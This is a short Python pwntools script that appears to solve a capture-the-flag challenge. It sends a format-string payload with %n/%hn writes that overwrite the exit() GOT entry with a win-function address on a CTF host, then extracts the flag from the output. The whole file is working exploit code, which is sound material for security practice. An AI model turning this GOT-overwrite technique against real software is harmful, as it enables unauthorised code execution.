#!/usr/bin/env python3
from pwn import *

EXIT_GOT = 0x400a50  # = 4,196,944
WIN_ADDR = 0x401216

PAD1 = EXIT_GOT - 18  # 4,196,926
PAD2 = (WIN_ADDR & 0xFFFF) - (EXIT_GOT % 65536)  # 1990

fmt = f"%{PAD1}c" + "%c" * 18 + "%n" + f"%{PAD2}c" + "%hn"
payload = fmt.encode()  # 56 bytes

p = remote('talking-mirror.ctf.prgy.in', 1337, ssl=True)
p.recvuntil(b'repeat it.\n')
p.sendline(payload)

# Receive ~4.2MB of output (padding + flag)
data = p.recvall(timeout=120)
text = data.decode(errors='ignore')

if 'p_ctf' in text:
    idx = text.index('p_ctf')
    flag = text[idx:].split('}')[0] + '}'
    print(f"FLAG: {flag}")

p.close()
